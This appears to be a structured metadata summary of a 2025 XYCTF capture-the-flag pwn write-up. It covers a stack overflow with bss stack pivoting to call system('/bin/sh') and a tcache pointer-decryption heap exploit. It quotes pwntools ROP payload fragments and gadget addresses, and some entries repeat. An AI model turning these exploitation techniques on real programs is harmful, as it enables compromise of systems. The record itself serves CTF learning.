...
quality: high
full_path: 2025XYCTF_writeup_by_Mini-Venom.full.md
meta_path: 2025XYCTF_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2025 XYCTF writeup by Mini-Venom（菜单 pwn + bss 写 /bin/sh + leave;ret）。XYCTF 菜单 pwn：1 4 1 触发栈溢出 + bss 写 /bin/sh + ret;ret 对齐 + leave_ret 栈迁移 + system("/bin/sh")。。关键路径：菜单 1 4 1 触发栈溢出，0x40 字节 padding...
category: pwn
subcategory: rop
subcategories:
- rop
...
contest_type: open
wp_url: https://www.ctfiot.com/235968.html
wp_author: Mini-Venom
reasoning_chain:
- '[触发点] 菜单 pwn 1 4 1 触发栈溢出 → 假设：bss 写 /bin/sh + leave_ret 栈迁移 → [动作] payload = b''a''*0x40 + p64(bss+0x40) + p64(ret)*2 + p64(0x4018A8) → [观察] bss 段写入控制权 → [下一步] system(''/bin/sh'')'
- '[触发点] sh=0x405a00 bss 写 /bin/sh\x00 → 假设：ret 对齐 + leave_ret 栈迁移 → [动作] pay = b''/bin/sh\x00'' + p64(rdi+1) + p64(rdi) + p64(sh) + p64(elf.plt[''system'']) → [观察] payload = pay.ljust(0x40, b''\x00'') + p64(0x405a00) + p64(leave_ret) → [下一步] shell'
- '[触发点] 第二题 tcache 加密指针 leak → 假设：先 leak heap 再 xor → [动作] show(7) 拿到 libc_base → free 拿到 heap_base → [观察] 加解密指针 → [下一步] setcontext+53 ORW'
- '[触发点] 菜单 pwn 1 4 1 触发栈溢出 → 假设：bss 写 /bin/sh + leave_ret 栈迁移 → [动作] payload = b''a''*0x40 + p64(bss+0x40) + p64(ret)*2 + p64(0x4018A8) → [观察] bss 段写入控制权 → [下一步] system(''/bin/sh'')'
- '[触发点] sh=0x405a00 bss 写 /bin/sh\x00 → 假设：ret 对齐 + leave_ret 栈迁移 → [动作] pay = b''/bin/sh\x00'' + p64(rdi+1) + p64(rdi) + p64(sh) + p64(elf.plt[''system'']) → [观察] payload = pay.ljust(0x40, b''\x00'') + p64(0x405a00) + p64(leave_ret) → [下一步] shell'
- '[触发点] 第二题 tcache 加密指针 leak → 假设：先 leak heap 再 xor → [动作] show(7) 拿到 libc_base → free 拿到 heap_base → [观察] 加解密指针 → [下一步] setcontext+53 ORW'
failed_attempts:
- 试图直接 system → 失败：system movaps 要求 16 字节对齐
- 试图覆盖 __free_hook → 失败：glibc 2.32+ 已移除
- 试图不解密指针直接 leak → 失败：tcache 加密
key_observations:
- ret;ret gadget 用来 16 字节对齐栈（system 之类要求 movaps 16 字节对齐）
- rdi+1 是 ret 替代（gadget 中间夹杂 ret）
- glibc 2.32+ tcache 加密指针需先 leak heap 再 xor
- leave_ret + bss 写 /bin/sh 是栈迁移经典组合
prerequisites:
- 栈对齐（movaps 16 字节）
- pwntools ELF / leave_ret 利用
- tcache 加密指针 leak 技巧
- setcontext+53 ORW
---
